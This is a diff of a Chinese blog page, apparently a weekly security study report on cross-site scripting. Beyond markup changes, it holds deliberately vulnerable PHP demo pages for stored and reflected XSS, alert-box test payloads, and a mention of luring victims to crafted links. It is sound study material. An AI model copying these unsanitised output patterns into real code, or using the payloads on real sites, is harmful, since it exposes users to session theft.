@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 <script>
@@ -30,8 +30,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -50,7 +50,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -84,9 +84,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -104,7 +104,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -115,42 +115,42 @@
 
 
 
-<meta name="description" content="任务标题：web安全之XSS漏洞学习实战1、编写一个存在 xss 漏洞的页面 2、利用 xss 漏洞获取当前用户 cookie 3、思考，利用 xss 漏洞能干嘛（参考 beef） 报告要求：记录编写的页面代码、操作流程、思考总结 扩展学习：学习如何防御 xss、总结防御策略加到报告里">
+<meta name="description" content="任务标题：web安全之XSS漏洞学习实战1、编写一个存在 xss 漏洞的页面 2、利用 xss 漏洞获取当前用户 cookie 3、思考，利用 xss 漏洞能干嘛（参考 beef） 报告要求：记录编写的页面代码、操作流程、思考总结 扩展学习：学习如何防御 xss、总结防御策略加到报告里   学习报告0x01 XSS简介XSS（Cross Site Scripting）攻击全称跨站脚本攻击，是为不和">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第十二周：XSS漏洞学习实战">
-<meta property="og:url" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/index.html">
+<meta property="og:url" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/index.html">
 <meta property="og:site_name" content="Bu1&#39;Blog">
-<meta property="og:description" content="任务标题：web安全之XSS漏洞学习实战1、编写一个存在 xss 漏洞的页面 2、利用 xss 漏洞获取当前用户 cookie 3、思考，利用 xss 漏洞能干嘛（参考 beef） 报告要求：记录编写的页面代码、操作流程、思考总结 扩展学习：学习如何防御 xss、总结防御策略加到报告里">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108094756253.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108102719695.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108103109009.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108103238345.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108094651918.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108125702703.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108125859890.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108150648399.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107185039709.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107190729950.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107191153852.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107212147753.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107215703375.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210107215828732.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108153209725.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108153631445.png">
-<meta property="og:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108155930639.png">
-<meta property="og:updated_time" content="2021-01-12T07:47:14.354Z">
+<meta property="og:description" content="任务标题：web安全之XSS漏洞学习实战1、编写一个存在 xss 漏洞的页面 2、利用 xss 漏洞获取当前用户 cookie 3、思考，利用 xss 漏洞能干嘛（参考 beef） 报告要求：记录编写的页面代码、操作流程、思考总结 扩展学习：学习如何防御 xss、总结防御策略加到报告里   学习报告0x01 XSS简介XSS（Cross Site Scripting）攻击全称跨站脚本攻击，是为不和">
+<meta property="og:locale">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108094756253.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108102719695.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108103109009.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108103238345.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108094651918.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108125702703.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108125859890.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108150648399.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107185039709.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107190729950.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107191153852.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107212147753.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107215703375.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210107215828732.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108153209725.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108153631445.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108155930639.png">
+<meta property="article:published_time" content="2021-01-12T07:41:14.000Z">
+<meta property="article:modified_time" content="2021-01-12T07:47:14.354Z">
+<meta property="article:author" content="Bu1">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第十二周：XSS漏洞学习实战">
-<meta name="twitter:description" content="任务标题：web安全之XSS漏洞学习实战1、编写一个存在 xss 漏洞的页面 2、利用 xss 漏洞获取当前用户 cookie 3、思考，利用 xss 漏洞能干嘛（参考 beef） 报告要求：记录编写的页面代码、操作流程、思考总结 扩展学习：学习如何防御 xss、总结防御策略加到报告里">
-<meta name="twitter:image" content="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108094756253.png">
+<meta name="twitter:image" content="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108094756253.png">
 
 
 
 <script type="text/javascript" id="hexo.configurations">
   var NexT = window.NexT || {};
   var CONFIG = {
-    root: '/',
+    root: '',
     scheme: 'Muse',
     version: '5.1.4',
     sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
@@ -173,7 +173,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/">
+  <link rel="canonical" href="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/"/>
 
 
 
@@ -189,7 +189,7 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
@@ -207,7 +207,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">Bu1'Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -235,9 +235,9 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             首页
           </a>
@@ -245,9 +245,9 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             归档
           </a>
@@ -255,9 +255,9 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
+          <a href="/categories/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
             
             分类
           </a>
@@ -265,9 +265,9 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
+          <a href="/about/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
             关于
           </a>
@@ -306,11 +306,11 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Bu1">
-      <meta itemprop="description" content>
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.png">
     </span>
 
@@ -346,7 +346,7 @@
           </span>
 
           
-            <span class="post-category">
+            <span class="post-category" >
             
               <span class="post-meta-divider">|</span>
             
@@ -358,7 +358,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/信安之路/" itemprop="url" rel="index">
+                  <a href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index">
                     <span itemprop="name">信安之路</span>
                   </a>
                 </span>
@@ -376,8 +376,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2021/01/12/第十二周：XSS漏洞学习实战/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/01/12/第十二周：XSS漏洞学习实战/" itemprop="commentCount"></span>
+                <a href="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2021/01/12/第十二周：XSS漏洞学习实战/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -441,90 +442,80 @@
 <p>3、思考，利用 xss 漏洞能干嘛（参考 beef）</p>
 <p>报告要求：记录编写的页面代码、操作流程、思考总结</p>
 <p>扩展学习：学习如何防御 xss、总结防御策略加到报告里</p>
-<a id="more"></a>
+<!--  more -->
 
 <h1 id="学习报告"><a href="#学习报告" class="headerlink" title="学习报告"></a>学习报告</h1><h2 id="0x01-XSS简介"><a href="#0x01-XSS简介" class="headerlink" title="0x01 XSS简介"></a>0x01 XSS简介</h2><p>XSS（Cross Site Scripting）攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。主要有三种类型：存储型XSS、反射型XSS<code>也叫做非持久性</code>、Dom型XSS。</p>
 <h3 id="1-存储型XSS"><a href="#1-存储型XSS" class="headerlink" title="1. 存储型XSS"></a>1. 存储型XSS</h3><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>存储型XSS又称为持久型XSS，攻击者将XSS代码发送给了服务器，而服务器没有对这些代码做任何处理就直接存储在了数据库中，当下一个用户访问网站时直接从数据库调用出来传给前端，浏览器解析XSS代码就造成了XSS攻击。常见的攻击点在个人信息、发表文章、留言板等地方。</p>
 <p>流程图如下：</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108094756253.png" alt="image-20210108094756253"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108094756253.png" alt="image-20210108094756253"></p>
 <p>通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—&gt;后端不做处理传入数据库—&gt;别的用户访问页面—&gt;后端从数据库中调用XSS代码—&gt;前端渲染(执行js脚本)恶意代码实现攻击。</p>
-<h4 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;存储型XSS测试&lt;h2&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">请输入你要留言的内容：&lt;textarea id=&apos;Mid&apos; name=&quot;desc&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">请输入你的ID：&lt;input type=&quot;text&quot; name=&quot;user&quot;/&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot; onclick=&apos;loction=&quot;test.php&quot;&apos;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&apos;user&apos;])&amp;&amp;isset($_POST[&apos;desc&apos;]))&#123;</span><br><span class="line">$log=fopen(&quot;store.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($log,$_POST[&apos;user&apos;].&quot;\r\n&quot;);</span><br><span class="line">fwrite($log,$_POST[&apos;desc&apos;].&quot;\r\n&quot;);</span><br><span class="line">fclose($log);&#125;</span><br><span class="line">if(file_exists(&quot;store.txt&quot;))&#123;</span><br><span class="line">$read=fopen(&quot;store.txt&quot;,&apos;r&apos;);</span><br><span class="line">while(!feof($read))&#123;</span><br><span class="line">echo fgets($read).&quot;&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">fclose($read);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;留言板&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;存储型XSS测试&lt;h2&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">请输入你要留言的内容：&lt;textarea id=&#x27;Mid&#x27; name=&quot;desc&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">请输入你的ID：&lt;input type=&quot;text&quot; name=&quot;user&quot;/&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot; onclick=&#x27;loction=&quot;test.php&quot;&#x27;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&#x27;user&#x27;])&amp;&amp;isset($_POST[&#x27;desc&#x27;]))&#123;</span><br><span class="line">$log=fopen(&quot;store.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($log,$_POST[&#x27;user&#x27;].&quot;\r\n&quot;);</span><br><span class="line">fwrite($log,$_POST[&#x27;desc&#x27;].&quot;\r\n&quot;);</span><br><span class="line">fclose($log);&#125;</span><br><span class="line">if(file_exists(&quot;store.txt&quot;))&#123;</span><br><span class="line">$read=fopen(&quot;store.txt&quot;,&#x27;r&#x27;);</span><br><span class="line">while(!feof($read))&#123;</span><br><span class="line">echo fgets($read).&quot;&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">fclose($read);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>访问搭建好的测试代码，这里的store.txt文件模拟为后端数据库。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108102719695.png" alt="image-20210108102719695"></p>
-<p>在留言内容中插入<code>&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;</code>，然后提交。已经将数据写入的到数据库(store.txt)中了，现在每次访问这个页面都会弹窗。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108103109009.png" alt="image-20210108103109009"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108102719695.png" alt="image-20210108102719695"></p>
+<p>在留言内容中插入<code>&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt; </code>，然后提交。已经将数据写入的到数据库(store.txt)中了，现在每次访问这个页面都会弹窗。</p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108103109009.png" alt="image-20210108103109009"></p>
 <p>看一下网页源代码，可以看到之前测试插入的代码从数据库中抽出来了，这里有四个的原因是因为我重复刷新了四次作为测试。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108103238345.png" alt="image-20210108103238345"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108103238345.png" alt="image-20210108103238345"></p>
 <p><strong>在实际的渗透测试过程中我们要注意传递带有<code>&quot;&quot;</code>可能会导致闭合sql语句引起程序错误，所有在测试语句中需要转义一下<code>&lt;script&gt;alert(\&#39;hack\&#39;)&lt;/script&gt;</code></strong> 或者<code>&lt;script&gt;alert(/hack/)&lt;/script&gt;</code></p>
 <h3 id="2-反射性XSS"><a href="#2-反射性XSS" class="headerlink" title="2. 反射性XSS"></a>2. 反射性XSS</h3><h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>反射型XSS非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面，在发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。这类攻击手段大多数是用来盗取用户的Cookie信息。</p>
 <p>流程图如下：</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108094651918.png" alt="image-20210108094651918"></p>
+<p><img src="/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/image-20210108094651918.png" alt="image-20210108094651918"></p>
 <p>通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—&gt;别的用户访问这个URL—&gt;恶意代码被服务器解析—&gt;传递给前端渲染实现攻击。</p>
-<h4 id="实例代码-1"><a href="#实例代码-1" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;XSS_test&lt;/title&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;txt/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;反射型XSS测试&lt;h2&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$age = $_GET[&apos;age&apos;];</span><br><span class="line">echo &quot;&lt;h1&gt;我的年龄是&quot;.$age.&quot;&lt;/h1&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="实例代码-1"><a href="#实例代码-1" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;XSS_test&lt;/title&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;txt/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;反射型XSS测试&lt;h2&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$age = $_GET[&#x27;age&#x27;];</span><br><span class="line">echo &quot;&lt;h1&gt;我的年龄是&quot;.$age.&quot;&lt;/h1&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
-<p>这个代码的意思很简单，就是读取一个age的值并将它打印到屏幕上，当我们精心构造特殊值的时候就可以引起反射型XSS攻击，比如这个实例中，我们将age赋值为<code>&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;</code>，然后再将整个链接发送给被攻击者，通过社工等手段引诱被攻击者点击这个链接就可以实现XSS攻击。</p>
-<p><img src="/2021/01/12/第十二周：XSS漏洞学习实战/image-20210108125702703.png" alt="image-20210108125702703"></p>
